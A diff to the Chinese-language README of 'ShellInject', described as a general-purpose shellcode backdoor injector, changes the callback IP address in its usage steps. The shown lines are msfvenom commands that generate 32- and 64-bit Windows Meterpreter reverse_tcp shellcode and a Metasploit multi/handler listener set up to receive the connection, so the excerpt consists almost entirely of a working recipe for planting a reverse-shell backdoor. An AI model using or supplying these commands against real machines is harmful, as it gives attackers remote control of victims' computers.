@@ -41,7 +41,7 @@ ShellInject 是一款通用ShellCode后门注入器，该工具主要用于在�
 首先需要通过`Metasploit`工具生成一个有效载荷，如下是32位与64位载荷生成命令。
 ```
 32位载荷生成
-[root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.116 LPORT=9999 -f c
+[root@lyshark ~]# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
 
 64位载荷生成
 [root@lyshark ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
@@ -51,7 +51,7 @@ ShellInject 是一款通用ShellCode后门注入器，该工具主要用于在�
 32位侦听器配置
 msf6 > use exploit/multi/handler
 msf6 > set payload windows/meterpreter/reverse_tcp
-msf6 > set lhost 192.168.1.116
+msf6 > set lhost 192.168.93.128
 msf6 > set lport 9999
 msf6 exploit(multi/handler) > exploit
 
